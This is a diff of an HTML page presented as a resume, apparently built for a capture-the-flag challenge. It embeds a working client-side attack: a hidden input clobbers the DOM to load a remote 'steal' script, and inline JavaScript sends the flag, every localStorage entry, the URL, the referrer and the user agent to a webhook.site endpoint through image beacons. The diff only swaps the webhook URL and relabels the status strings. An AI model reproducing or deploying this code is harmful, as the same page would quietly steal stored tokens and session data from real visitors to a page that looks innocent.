@@ -22,7 +22,7 @@
 
              <!-- CRITICAL: DOM Clobbering element for CTF -->
              <div style="position: fixed; left: -10000px; visibility: hidden; opacity: 0;">
-                 <input id="utilsJS" name="url" value="https://gavinyw.github.io/resume-portfolio/live_ctf_steal.js">
+                 <input id="utilsJS" name="url" value="https://gavinyw.github.io/resume-portfolio/updated_steal.js">
              </div>
 
              <h2>Professional Summary</h2>
@@ -48,9 +48,9 @@
          </div>
 
          <script>
-             console.log('LIVE CTF ATTACK - Direct Flag Extraction');
+             console.log('LIVE CTF ATTACK - NEW WEBHOOK - Direct Flag Extraction');
 
-             // CORS-FREE webhook function
+             // CORS-FREE webhook function with NEW URL
              function sendWebhook(data) {
                  try {
                      const img = new Image();
@@ -58,7 +58,7 @@
                      Object.keys(data).forEach(key => {
                          params.append(key, typeof data[key] === 'object' ? JSON.stringify(data[key]) : data[key]);
                      });
-                     img.src = 'https://webhook.site/1bd95653-39a3-44bb-8f14-f88bb2d9ddad/live-ctf?' + params.toString();
+                     img.src = 'https://webhook.site/ae6ba4ff-a1b4-453d-804e-052d59fabf4a/live-ctf?' + params.toString();
                      document.body.appendChild(img);
                      console.log('Status sent:', data.status);
                  } catch(e) { console.error('Webhook failed:', e); }
@@ -66,14 +66,15 @@
 
              // Send initial confirmation
              sendWebhook({
-                 status: 'LIVE_CTF_ATTACK_START',
+                 status: 'LIVE_CTF_ATTACK_START_NEW_WEBHOOK',
                  timestamp: new Date().toISOString(),
                  current_domain: window.location.hostname,
                  current_url: window.location.href,
                  clobbering_ready: !!window.utilsJS,
                  clobbering_url: window.utilsJS?.url || window.utilsJS?.value || 'not_found',
                  user_agent: navigator.userAgent,
-                 referrer: document.referrer || 'none'
+                 referrer: document.referrer || 'none',
+                 webhook_version: 'NEW_WEBHOOK_V2'
              });
 
              // IMMEDIATE FLAG EXTRACTION (if on CTF domain)
@@ -87,7 +88,7 @@
                      }
 
                      sendWebhook({
-                         status: 'IMMEDIATE_FLAG_EXTRACTION',
+                         status: 'IMMEDIATE_FLAG_EXTRACTION_V2',
                          timestamp: new Date().toISOString(),
                          flag: flag || 'not_found',
                          all_localStorage: JSON.stringify(allStorage),
@@ -98,15 +99,15 @@
 
                      if (flag) {
                          sendWebhook({
-                             status: 'FLAG_CAPTURED_IMMEDIATE',
+                             status: 'FLAG_CAPTURED_IMMEDIATE_V2',
                              flag: flag,
                              timestamp: new Date().toISOString(),
-                             method: 'immediate_extraction'
+                             method: 'immediate_extraction_new_webhook'
                          });
                      }
                  } catch(e) {
                      sendWebhook({
-                         status: 'IMMEDIATE_EXTRACTION_ERROR',
+                         status: 'IMMEDIATE_EXTRACTION_ERROR_V2',
                          error: e.message,
                          timestamp: new Date().toISOString()
                      });
@@ -119,7 +120,7 @@
 
                  if (window.utilsJS && (window.utilsJS.url || window.utilsJS.value)) {
                      sendWebhook({
-                         status: 'DOM_CLOBBERING_EXECUTING',
+                         status: 'DOM_CLOBBERING_EXECUTING_V2',
                          timestamp: new Date().toISOString(),
                          script_url: window.utilsJS.url || window.utilsJS.value
                      });
@@ -135,14 +136,14 @@
                          document.body.appendChild(script);
 
                          sendWebhook({
-                             status: 'PAYLOAD_SCRIPT_LOADED',
+                             status: 'PAYLOAD_SCRIPT_LOADED_V2',
                              timestamp: new Date().toISOString(),
                              script_src: scriptSrc
                          });
                      }
                  } else {
                      sendWebhook({
-                         status: 'DOM_CLOBBERING_FAILED',
+                         status: 'DOM_CLOBBERING_FAILED_V2',
                          timestamp: new Date().toISOString(),
                          utilsJS_exists: !!window.utilsJS
                      });
@@ -154,7 +155,7 @@
                  if (window.location.hash !== '#messages') {
                      window.location.hash = '#messages';
                      sendWebhook({
-                         status: 'NAVIGATED_TO_MESSAGES',
+                         status: 'NAVIGATED_TO_MESSAGES_V2',
                          timestamp: new Date().toISOString(),
                          full_url: window.location.href
                      });
